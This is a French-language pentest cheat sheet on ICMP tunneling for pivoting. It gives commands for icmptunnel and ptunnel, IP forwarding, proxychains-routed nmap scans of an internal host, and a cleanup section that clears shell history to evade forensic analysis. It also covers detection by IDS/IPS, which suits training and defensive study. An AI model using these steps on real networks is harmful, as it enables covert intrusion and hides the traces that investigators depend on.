## ICMP Tunneling for Pivoting

Le tunneling ICMP permet de contourner les restrictions réseau en encapsulant du trafic dans des paquets **ICMP Echo Request** et **Echo Reply**. Cette technique s'inscrit dans les stratégies de **Pivoting and Tunneling** pour établir un proxy SOCKS et exfiltrer du trafic sans utiliser les ports TCP/UDP standards.

```mermaid
flowchart LR
    A[Attaquant] -- ICMP Tunnel --> B[Pivot/Serveur]
    B -- Proxy SOCKS --> C[Cible Interne]
```

> [!danger] Prérequis système
> L'utilisation de ces outils nécessite des privilèges **root** sur les deux machines (client et serveur) pour manipuler les interfaces réseau et capturer les paquets ICMP.

> [!warning] Risques de détection
> Le tunnel ICMP est hautement détectable par les solutions **IDS/IPS**. Un volume anormalement élevé de paquets **ICMP** ou des tailles de paquets inhabituelles déclenchent généralement des alertes immédiates au sein d'un SOC.

> [!info] Limitations techniques
> Le débit est très faible, inadapté aux transferts de fichiers volumineux. Le tunnel ICMP peut être instable en cas de perte de paquets, impactant la fiabilité des connexions **SOCKS**.

## Installation des outils

L'installation nécessite la compilation des sources sur les systèmes cibles.

### Installation de icmptunnel

```bash
git clone https://github.com/jamesbarlow/icmptunnel.git
cd icmptunnel
make
sudo cp icmptunnel /usr/local/bin/
```

## Gestion des privilèges (sudo requis)

L'exécution des outils de tunneling ICMP nécessite des privilèges élevés pour intercepter les paquets au niveau de la couche réseau (Raw Sockets).

```bash
# Vérification des privilèges effectifs
id
# L'exécution doit être effectuée via sudo ou en tant que root
sudo icmptunnel -s
```

## Configuration du routage IP (sysctl)

Pour que la machine pivot puisse relayer le trafic vers le réseau interne, le noyau doit autoriser le transfert de paquets entre les interfaces.

```bash
# Activation temporaire du routage IP
sudo sysctl -w net.ipv4.ip_forward=1

# Vérification de la configuration
cat /proc/sys/net/ipv4/ip_forward
# Doit retourner 1
```

## Démarrer le Serveur (Pivot)

Le serveur agit comme le point de terminaison du tunnel et le proxy SOCKS.

### Exécution du serveur

```bash
sudo icmptunnel -s
```

Utilisation alternative avec **ptunnel** :

```bash
sudo ptunnel -x password -l 443
```

## Démarrer le Client (Attaque)

Le client encapsule le trafic local dans des paquets ICMP à destination du serveur.

### Exécution du client

```bash
sudo icmptunnel -c <IP_du_serveur>
```

Utilisation alternative avec **ptunnel** :

```bash
sudo ptunnel -p <IP_du_serveur> -x password -l 1080
```

## Configuration de Proxychains

Pour router le trafic applicatif via le tunnel, configurez **proxychains** dans le fichier **/etc/proxychains.conf** :

```ini
socks5 127.0.0.1 1080
```

Utilisation pour des outils de **Linux Post-Exploitation** :

```bash
proxychains nmap -sT -Pn 172.16.5.19 -p3389 -v
proxychains firefox
```

## Vérification des Connexions

### Analyse du trafic

```bash
sudo tcpdump -i eth0 icmp
```

### État des processus

```bash
netstat -antp | grep icmp
```

## Comparaison de performance avec d'autres méthodes de tunneling

| Méthode | Protocole | Débit | Détectabilité | Complexité |
| :--- | :--- | :--- | :--- | :--- |
| **ICMP Tunneling** | ICMP | Très faible | Très élevée | Moyenne |
| **SSH Dynamic Port Forwarding** | TCP | Élevé | Faible | Faible |
| **DNS Tunneling** | DNS | Faible | Moyenne | Élevée |
| **HTTP/S Proxy** | TCP | Très élevé | Faible | Très faible |

## Nettoyage des traces

Il est impératif de supprimer les artefacts après l'utilisation pour éviter la détection lors d'une analyse forensique ou d'un **Network Traffic Analysis**.

```bash
# Désactivation du routage IP
sudo sysctl -w net.ipv4.ip_forward=0

# Suppression des binaires et fichiers temporaires
rm -rf /usr/local/bin/icmptunnel
rm -rf ~/icmptunnel

# Nettoyage des logs de commande (si nécessaire)
history -c && history -w
```

## Limitations et Détection

*   **Filtres IDS/IPS** : Inspection profonde des paquets (DPI) identifiant les charges utiles non conformes dans les paquets **ICMP**.
*   **Débit limité** : Latence élevée inhérente au protocole **ICMP**.
*   **Jitter** : Instabilité des connexions TCP encapsulées.
*   **Logs** : Surveillance des logs système pour détecter des processus **icmptunnel** ou **ptunnel** actifs.